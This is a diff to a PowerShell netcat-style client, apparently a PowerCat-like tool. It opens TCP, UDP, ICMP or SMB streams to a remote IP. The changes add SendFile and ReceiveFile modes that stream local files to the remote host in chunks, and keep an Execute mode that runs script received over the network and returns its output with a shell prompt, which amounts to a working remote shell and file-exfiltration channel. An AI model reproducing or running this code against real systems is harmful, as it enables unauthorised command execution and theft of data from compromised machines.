@@ -14,24 +14,18 @@
         [Parameter(ParameterSetName = 'Execute')]
         [Alias('e')]
         [Switch]$Execute,
-    
-        [Parameter(ParameterSetName = 'Input')]
-        [Alias('i')]
-        [Object]$Input,
         
         [Parameter(ParameterSetName = 'Relay')]
         [Alias('r')]
         [String]$Relay,
 
-        [Parameter(ParameterSetName = 'OutFile')]
-        [Alias('of')]
-        [String]$OutputFile,
+        [Parameter(ParameterSetName = 'ReceiveFile')]
+        [Alias('rf')]
+        [String]$ReceiveFile,
     
-        [Parameter(ParameterSetName = 'OutFile', Mandatory = $true)]
-        [Parameter(ParameterSetName = 'Console', Mandatory = $true)]
-        [Alias('ot')]
-        [ValidateSet('Bytes','String')]
-        [String]$OutputType,
+        [Parameter(ParameterSetName = 'SendFile')]
+        [Alias('sf')]
+        [String]$SendFile,
     
         [Parameter()]
         [Alias('d')]
@@ -66,7 +60,33 @@
 
         return $ParameterDictionary
     }
-    Begin {         
+    Begin {     
+        Write-Verbose "Setting up network stream..."
+
+        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)
+
+        switch ($Mode) {
+           'Icmp' { 
+                try { $InitialBytes, $ClientStream = New-IcmpStream $ServerIp $ParameterDictionary.BindAddress.Value }
+                catch { Write-Warning "Failed to open Icmp stream. $($_.Exception.Message)" ; return }
+                continue 
+            }
+            'Smb' { 
+                try { $ClientStream = New-SmbStream $RemoteIp $ParameterDictionary.PipeName.Value  }
+                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; return }
+                continue 
+            }
+            'Tcp' { 
+                try { $ClientStream = New-TcpStream $ServerIp $ParameterDictionary.Port.Value }
+                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; return }
+                continue 
+            }
+            'Udp' { 
+                try { $InitialBytes, $ClientStream = New-UdpStream $ServerIp $ParameterDictionary.Port.Value }
+                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; return }
+            }
+        }
+            
         switch ($Encoding) {
             'Ascii' { $EncodingType = New-Object Text.AsciiEncoding ; continue }
           'Unicode' { $EncodingType = New-Object Text.UnicodeEncoding ; continue }
@@ -75,14 +95,38 @@
             'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
         }
       
-        if ($PSCmdlet.ParameterSetName -eq 'Input') {   
+        if ($PSCmdlet.ParameterSetName -eq 'SendFile') {   
             
-            Write-Verbose 'Parsing input...'
+            Write-Verbose 'Reading file bytes...'
 
-            if ((Test-Path $Input)) { $BytesToSend = [IO.File]::ReadAllBytes($Input) }     
-            elseif ($Input.GetType() -eq [Byte[]]) { $BytesToSend = $Input }
-            elseif ($Input.GetType() -eq [String]) { $BytesToSend = $EncodingType.GetBytes($Input) }
-            else { Write-Warning 'Incompatible input type.' ; return }
+            if ((Test-Path $SendFile)) { 
+                $FileSize = (Get-Item $SendFile).Length
+
+                $FileStream = New-Object IO.FileStream -ArgumentList @($SendFile, [IO.FileMode]::Open)
+                $BytesLeft = $FileStream.Length
+                $FileOffset = 0
+
+                if ($FileStream.Length -gt 65536) {
+                    $BytesToSend = New-Object Byte[] 65536
+                    do {
+                        [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
+                        [void]$FileStream.Read($BytesToSend, 0, $BytesToSend.Length)
+                        $FileOffset += $BytesToSend.Length
+                        $BytesLeft -= $BytesToSend.Length
+                        Write-NetworkStream $Mode $ClientStream $BytesToSend
+                    } while ($BytesLeft -gt $BytesToSend.Length)
+                    $BytesToSend = New-Object Byte[] $BytesLeft
+                    $FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
+                    $FileStream.Read($BytesToSend, 0, $BytesLeft)
+                    Write-NetworkStream $Mode $ClientStream $BytesToSend
+                }
+                else {
+                    try { $BytesToSend = [IO.File]::ReadAllBytes($SendFile) } 
+                    catch { Write-Warning $_.Exception.Message }
+                    Write-NetworkStream $Mode $ClientStream $BytesToSend
+                }
+            }
+            else { Write-Warning "$SendFile does not exist." }
         }
 
         elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
@@ -131,42 +175,18 @@
             if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
             $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
             
+            Write-NetworkStream $Mode $ClientStream $BytesToSend
             $ScriptBlock = $null
+            $BytesToSend = $null
         }
-
-        Write-Verbose "Setting up network stream..."
-
-        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)
-
-        switch ($Mode) {
-           'Icmp' { 
-                try { $InitialBytes, $ClientStream = New-IcmpStream $ServerIp $ParameterDictionary.BindAddress.Value }
-                catch { Write-Warning "Failed to open Icmp stream. $($_.Exception.Message)" ; return }
-                continue 
-            }
-            'Smb' { 
-                try { $ClientStream = New-SmbStream $RemoteIp $ParameterDictionary.PipeName.Value  }
-                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; return }
-                continue 
-            }
-            'Tcp' { 
-                try { $ClientStream = New-TcpStream $ServerIp $ParameterDictionary.Port.Value }
-                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; return }
-                continue 
-            }
-            'Udp' { 
-                try { $InitialBytes, $ClientStream = New-UdpStream $ServerIp $ParameterDictionary.Port.Value }
-                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; return }
-            }
-        }
-      
-        if ($BytesToSend.Count) { Write-NetworkStream $Mode $ClientStream $BytesToSend }        
     }
-    Process {     
-    
-        if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }
+    Process {             
+        [console]::TreatControlCAsInput = $true
 
         while ($true) {
+        
+            if ($PSCmdlet.ParameterSetName -eq 'SendFile') { Write-Verbose "$SendFile sent." ; break }
+            if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }
             
             # Catch Esc / Read-Host
             if ([console]::KeyAvailable) {          
@@ -198,37 +218,31 @@
             
                 $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
             
-                $Error.Clear()
-
+                $Global:Error.Clear()
+                
                 $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
-                if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
+                foreach ($Err in $Global:Error) { $BytesToSend += $EncodingType.GetBytes($Err.Exception.Message) }
                 $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
-            
+                
                 Write-NetworkStream $Mode $ClientStream $BytesToSend 
                 $BytesToSend = $null
                 $ScriptBlock = $null
                 continue
             }
             elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { Write-NetworkStream $RelayMode $RelayStream $ReceivedBytes ; continue }
-            elseif ($PSCmdlet.ParameterSetName -eq 'OutFile') { 
-                if ($OutputType -eq 'Bytes') { 
-                    $FileStream = New-Object IO.FileStream -ArgumentList @($OutputFile, [IO.FileMode]::Append)
-                    [void]$FileStream.Seek(0, [IO.SeekOrigin]::End) 
-                    $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) 
-                    $FileStream.Flush() 
-                    $FileStream.Dispose() 
-                    continue
-                }
-                else { $EncodingType.GetString($ReceivedBytes) | Out-File -Append -FilePath $OutputFile ; continue }
+            elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { 
+                $FileStream = New-Object IO.FileStream -ArgumentList @($ReceiveFile, [IO.FileMode]::Append)
+                [void]$FileStream.Seek(0, [IO.SeekOrigin]::End) 
+                $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) 
+                $FileStream.Flush() 
+                $FileStream.Dispose() 
+                break
             }
-            else { # StdOut
-                if ($OutputType -eq 'Bytes') { Write-Output $ReceivedBytes }
-                else { Write-Host -NoNewline $EncodingType.GetString($ReceivedBytes).TrimEnd("`r") }
-            }
+            else { Write-Host -NoNewline $EncodingType.GetString($ReceivedBytes).TrimEnd("`r") }
         }
     }
     End {   
-
+        [console]::TreatControlCAsInput = $false
         Write-Verbose 'Attempting to close network stream.'
       
         try { Close-NetworkStream $Mode $ClientStream }
